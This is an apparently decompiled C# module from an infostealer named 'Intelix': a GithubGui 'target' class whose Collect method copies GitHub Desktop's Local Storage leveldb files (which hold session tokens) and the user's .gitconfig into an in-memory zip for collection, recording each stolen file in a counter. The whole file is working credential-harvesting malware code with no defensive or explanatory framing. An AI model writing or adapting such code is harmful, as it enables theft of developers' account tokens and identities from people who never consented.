using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000046 RID: 70
	public class GithubGui : ITarget
	{
		// Token: 0x060000E7 RID: 231 RVA: 0x0000D894 File Offset: 0x0000BA94
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string path = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\GitHub Desktop\\Local Storage\\leveldb\\";
			bool flag = !Directory.Exists(path);
			if (!flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "GithubGui";
				string[] allowedExtensions = new string[]
				{
					".log",
					".ldb"
				};
				Parallel.ForEach<string>(Directory.GetFiles(path), delegate(string file)
				{
					bool flag4 = allowedExtensions.Contains(Path.GetExtension(file));
					if (flag4)
					{
						string text3 = "GithubGui\\leveldb\\" + Path.GetFileName(file);
						zip.AddFile(text3, File.ReadAllBytes(file));
						counterApplications.Files.Add(file + " => " + text3);
					}
				});
				string text = "C:\\Users\\" + Environment.UserName + "\\.gitconfig";
				bool flag2 = File.Exists(text);
				if (flag2)
				{
					string text2 = "GithubGui\\.gitconfig";
					zip.AddFile(text2, File.ReadAllBytes(text));
					counterApplications.Files.Add(text + " => " + text2);
				}
				bool flag3 = counterApplications.Files.Count<string>() > 0;
				if (flag3)
				{
					counter.Applications.Add(counterApplications);
				}
			}
		}
	}
}
